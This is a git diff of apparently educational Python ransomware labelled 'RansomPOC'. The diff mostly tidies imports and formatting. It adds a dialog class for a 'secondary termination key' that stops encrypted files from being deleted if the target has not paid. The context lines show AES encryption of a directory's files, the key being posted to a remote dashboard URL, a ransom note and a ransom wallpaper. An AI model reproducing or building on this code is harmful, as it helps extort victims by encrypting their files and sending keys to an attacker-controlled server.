@@ -4,29 +4,25 @@ Author: Yakuza-D
 Disclaimer: this app written only and only for educational purpose
 """
 
-
-import sys
-#import tkinter as tk
-from tkinter import Toplevel, Entry, Label, Button
-
-from os import makedirs, path, remove, walk
-from ctypes import windll
 import logging
-from uuid import uuid4
-from requests import post, exceptions
-from time import sleep
-from json import dumps
+import sys
+from base64 import b64encode
+from ctypes import windll
 from datetime import datetime
+from json import dumps
+from os import makedirs, path, remove, walk
+# import tkinter as tk
+from tkinter import Toplevel, Entry, Label, Button, simpledialog
+from uuid import uuid4
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
-from base64 import b64encode
+from requests import post, exceptions
+from time import sleep
 
 
 """ Part 1: Application functions """
-
-
 # Defining Function to load the current path of ransom.py and then join it to relative_path
 def resource_path(relative_path):
     # Get Directory name of the current python file
@@ -131,7 +127,7 @@ class EncryptionTool:
         self.dashboard_url = dashboard_url
         self.max_attempts = max_attempts
         self.delay = delay
-        self.key = self.generate_key(password) # noqa
+        self.key = self.generate_key(password)  # noqa
         self.machine_id = str(uuid4())
 
     @staticmethod
@@ -278,7 +274,8 @@ Your Security Team
                     logging.info('Key sent successfully. Response OK.')
                     return True
                 else:
-                    logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
+                    logging.error(
+                        f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
             except exceptions.ConnectionError as e:
                 logging.error(f"Connection error on attempt {attempt + 1}: {e}")
             if attempt < self.max_attempts - 1:
@@ -353,9 +350,10 @@ Your Security Team
         # create Path of wallpaper & Set wallpaper on the target machine
         wallpaperPath = resource_path("img/wallpaper.png")
 
-        self.set_wallpaper(wallpaperPath) # noqa
+        self.set_wallpaper(wallpaperPath)  # noqa
         logging.info("[+] Wallpaper Set Successfully.")
         logging.info("[+] Encryption Process Completed. All files now encrypted.")
+
 
 # Define Termination Key Dialog class for user interactions
 class TerminationKeyDialog(Toplevel):
@@ -388,9 +386,16 @@ class TerminationKeyDialog(Toplevel):
         self.destroy()
 
 
+# Define CustomSecondaryTerminationKeyDialog class for user interactions
+class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
 
+    """ in this class, we have a dialog box to get the Secondary termination key from the user,
+     Secondary Termination key can Prevent Encryption File Deletion if target not paid """
 
-
+    def __init__(self, parent, icon_path, title, prompt):
+        super().__init__(parent, title)
+        self.iconPath = icon_path
+        self.prompt = prompt
 
 
 if __name__ == "__main__":
@@ -399,4 +404,3 @@ if __name__ == "__main__":
                                     password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
     encryptionTool.create_important_files(r"H:/Repo/RansomPOC")
     encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")
-
